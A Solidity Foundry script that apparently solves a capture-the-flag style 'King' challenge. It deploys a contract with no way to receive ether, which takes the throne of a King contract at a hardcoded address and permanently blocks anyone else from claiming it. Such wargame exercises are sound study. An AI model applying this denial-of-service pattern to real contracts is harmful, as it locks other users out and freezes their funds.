// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TheLastKing {
    constructor(King _kingInstacne) payable {
        (bool result,) = address(_kingInstacne).call{value: _kingInstacne.prize()}("");
        require(result);
    }
}

contract KingSolution is Script {

    King public kingInstance = King(payable(0xA0169e4E86e717185Ec644473B4c4d8Fa7452C62));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}